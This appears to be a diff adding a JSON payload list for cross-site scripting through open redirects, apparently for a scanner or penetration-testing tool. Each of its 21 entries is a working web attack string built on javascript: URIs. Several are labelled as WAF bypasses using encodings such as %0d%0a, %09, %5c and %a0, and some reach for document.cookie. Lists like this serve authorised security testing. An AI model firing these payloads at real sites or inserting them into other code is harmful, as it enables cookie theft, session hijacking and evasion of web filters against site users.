@@ -1,0 +1,85 @@
+[{
+		"name": "Basic xss as open redirect",
+		"payload": "javascript:alert(1)"
+	},
+	{
+		"name": "Basic xss WAF bypass as open redirect using '%0d%0a'",
+		"payload": "java%0d%0ascript%0d%0a:alert(0)"
+	},
+	{
+		"name": "XSS payload as open redirect using '%250A'",
+		"payload": "javascript://%250Aalert(1)"
+	},
+	{
+		"name": "XSS payload as open redirect using '%250A' and '//?1'",
+		"payload": "javascript://%250Aalert(1)//?1"
+	},
+	{
+		"name": "XSS payload as open redirect using '%250A1?'",
+		"payload": "javascript://%250A1?alert(1):0"
+	},
+	{
+		"name": "XSS payload as open redirect",
+		"payload": "%09Jav%09ascript:alert(document.domain)"
+	},
+	{
+		"name": "XSS payload as open redirect",
+		"payload": "javascript://%250Alert(document.location=document.cookie)"
+	},
+	{
+		"name": "XSS payload as open redirect using '%09'",
+		"payload": "/%09/javascript:alert(1);"
+	},
+	{
+		"name": "XSS payload as open redirect using '%09'",
+		"payload": "/%09/javascript:alert(1)"
+	},
+	{
+		"name": "XSS payload as open redirect using '%5c'",
+		"payload": "//%5cjavascript:alert(1);"
+	},
+	{
+		"name": "XSS payload as open redirect using '%5c'",
+		"payload": "//%5cjavascript:alert(1)"
+	},
+	{
+		"name": "XSS payload as open redirect using '%5c'",
+		"payload": "/%5cjavascript:alert(1);"
+	},
+	{
+		"name": "XSS payload as open redirect using '%5c'",
+		"payload": "/%5cjavascript:alert(1)"
+	},
+	{
+		"name": "XSS payload as open redirect using '%0a'",
+		"payload": "javascript://%0aalert(1)"
+	},
+	{
+		"name": "XSS payload as open redirect using '<>'",
+		"payload": "<>javascript:alert(1);"
+	},
+	{
+		"name": "XSS payload as open redirect",
+		"payload": "//javascript:alert(1);"
+	},
+	{
+		"name": "XSS payload as open redirect",
+		"payload": "//javascript:alert(1)"
+	},
+	{
+		"name": "XSS payload as open redirect",
+		"payload": "/javascript:alert(1);"
+	},
+	{
+		"name": "XSS WAF bypass payload using '%0d%0a' as open redirect",
+		"payload": "jaVAscript://whitelisted.com//%0d%0aalert(1);//"
+	},
+	{
+		"name": "XSS WAF bypass payload using '%a0' as open redirect",
+		"payload": "javascript://whitelisted.com?%a0alert%281%29"
+	},
+	{
+		"name": "Advanced XSS payload as open redirect",
+		"payload": "/x:1/:///%01javascript:alert(document.cookie)/"
+	}
+]
